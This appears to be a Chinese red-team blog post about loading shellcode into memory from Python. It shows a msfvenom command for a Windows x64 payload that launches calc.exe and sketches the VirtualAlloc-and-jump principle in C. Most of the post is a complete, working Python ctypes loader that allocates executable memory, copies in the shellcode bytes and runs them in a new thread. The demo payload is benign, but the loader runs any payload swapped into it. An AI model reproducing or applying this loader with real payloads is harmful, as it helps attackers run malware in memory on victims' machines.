---
title: Python内存加载shellcode
date: 2019-11-13 17:14:00
tags:
- shellcode
- 红队
- 工具
categories:
- 红队
---


## 生成

首先生成一个测试的msf shellcode

```bash
msfvenom -p windows/x64/exec CMD=calc.exe -f python
```

![enter description here](https://raw.githubusercontent.com/akkuman/pic/master/pic/2021/8/2cbc73b0e4018b2761dcfd1584da6661..png)


把其中的shellcode复制出来留待待会使用

## 原理

大部分脚本语言加载 shellcode 其实都是通过 `c` 的 `ffi` 去调用操作系统的api，其实并没有太多的技巧在里面，明白了原理，只需要查一下对应的脚本语言怎么调用 `c` 即可。

那么我们只需要明白 `c` 通常是怎么加载 `shellcode` 的即可一通百通。

那么 `c` 是怎么加载 `shellcode` 呢，我们直接从汇编开始探究。

`shellcode` 这个东西我们明白是一串可执行的二进制（一般可执行文件的拥有可执行权限的section为.text），那么我们先通过其他的手段开辟一片拥有可读可写可执行权限的区域放入我们的 `shellcode`，然后跳转到 `shellcode` 首地址去执行就行了，汇编里面改变eip（即当前指令的下一条即将运行指令的虚拟地址）的方法有不少，最简单的就是直接 `jmp` 过去了。也就是写成伪码大概意思就是（动态申请内存就不写了）

```assembly
lea eax, shellcode;
jmp eax;
```

那么我们用 `c` 怎么表示呢？我这里也写一段伪码（因为本文的重点并不是在于 `c` 代码的编写）

那么按照刚才的思路，先申请一块可执行的内存，放入 `shellcode` 然后跳转过去执行即可。

```c
// shellcode
unsigned char shellcode[] =
    "\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9" 
    "\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08"  
    "\x8b\x7e\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1"  
    ...;
// 定义一个函数类型
typedef void (__stdcall *CODE) ();
// 申请内存
PVOID p = NULL;  
p = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
// 把shellcode放入内存
memcpy(p, shellcode, sizeof(shellcode));

CODE code =(CODE)p;

code();
```

我并没有写出一个可用的 `c` 加载 `shellcode`，只是旨在点出一下流程，然后引出后面的 `python` 加载 `shellcode`，上面我们先申请了一块带有可读可写可执行权限的内存，然后把 `shellcode` 放进去，然后我们强转为一个函数类型指针，最后调用这个函数，达到了我们的目的。



## Python实现

前面我说过，大部分脚本语言加载 `shellcode` 都是调用的c的ffi，那么我们直接按照之前的思路来就行了。下面我直接贴代码

```python
import ctypes

shellcode =  b""
shellcode += b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41"
shellcode += b"\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48"
shellcode += b"\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f"
shellcode += b"\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c"
shellcode += b"\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52"
shellcode += b"\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b"
shellcode += b"\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0"
shellcode += b"\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56"
shellcode += b"\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9"
shellcode += b"\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0"
shellcode += b"\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58"
shellcode += b"\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
shellcode += b"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0"
shellcode += b"\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
shellcode += b"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
shellcode += b"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00"
shellcode += b"\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41"
shellcode += b"\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41"
shellcode += b"\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06"
shellcode += b"\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
shellcode += b"\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65"
shellcode += b"\x78\x65\x00"

shellcode = bytearray(shellcode)
# 设置VirtualAlloc返回类型为ctypes.c_uint64
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
# 申请内存
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
 
# 放入shellcode
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_uint64(ptr), 
    buf, 
    ctypes.c_int(len(shellcode))
)
# 创建一个线程从shellcode防止位置首地址开始执行
handle = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0), 
    ctypes.c_int(0), 
    ctypes.c_uint64(ptr), 
    ctypes.c_int(0), 
    ctypes.c_int(0), 
    ctypes.pointer(ctypes.c_int(0))
)
# 等待上面创建的线程运行完
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))
```

注意其中的的每个 `c_uint64`，这个类型在64位上是必要的，我们需要手动指定 ` argtypes` 和 `restype `，否则默认的是 32 位整型。

我的代码里面加了注释，我们可以看到，基本思路也是一样的，先分配一块可读可写可执行代码的内存，在代码中，我使用的是 `0x40`（PAGE_EXECUTE_READWRITE）和 `0x3000` ( 0x1000 | 0x2000)(MEM_COMMIT | MEM_RESERVE)，然后把 `shellcode` 塞进去，跳过去运行。

![enter description here](https://raw.githubusercontent.com/akkuman/pic/master/pic/2021/8/2edf4ff180769ceee15287bfacbcde97..png)

相信通过这一片文章的讲解你能够对 `shellcode` 的本质有更多的了解。